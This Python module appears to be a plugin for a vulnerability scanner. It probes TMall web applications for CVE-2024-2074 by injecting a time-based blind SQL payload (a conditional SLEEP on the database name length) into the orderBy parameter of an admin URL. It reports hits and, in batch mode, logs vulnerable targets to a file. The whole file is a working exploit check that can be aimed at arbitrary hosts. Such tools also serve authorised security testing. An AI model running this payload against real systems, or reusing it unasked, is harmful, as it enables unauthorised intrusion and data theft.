#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time

import requests,urllib3
from libs.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from libs.reqset import ReqSet
from libs.output import OutPutFile
urllib3.disable_warnings()
class Cve_2024_2074:
    def get_url(self,input_url):
        try:
            s = time.time()
            url = input_url + "/tmall/admin/user/1/1?orderBy=7,if((length(database())=11),SLEEP(8),0)"
            req = requests.get(url, headers=self.headers, proxies=self.proxy, verify=self.ssl)
            e = time.time()
            r = e - s
            if r > 8:
                OutPrintInfoSuc("TMall", f'目标存在CVE-2024-2074-SQL注入漏洞: {url}')
                if self.batch:
                    OutPutFile("tmall_2024_2074.txt",f'目标存在CVE-2024-2074-SQL注入漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("TMall", f'目标不存在CVE-2024-2074-SQL注入漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("TMall",'目标请求出错')
            return False


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        if not self.batch:
            req = ReqSet(header=header, proxy=proxy)
            self.proxy = req["proxy"]
            self.headers = req["header"]
        else:
            self.proxy = {"http": proxy, "https": proxy}
            req = ReqSet(header=header)
            self.headers = req["header"]
        if not self.batch:
            OutPrintInfo("TMall", '开始检测CVE-2024-2074-SQL注入漏洞...')
        self.get_url(url)
        if not self.batch:
            OutPrintInfo("TMall", 'CVE-2024-2074-SQL注入漏洞检测结束')



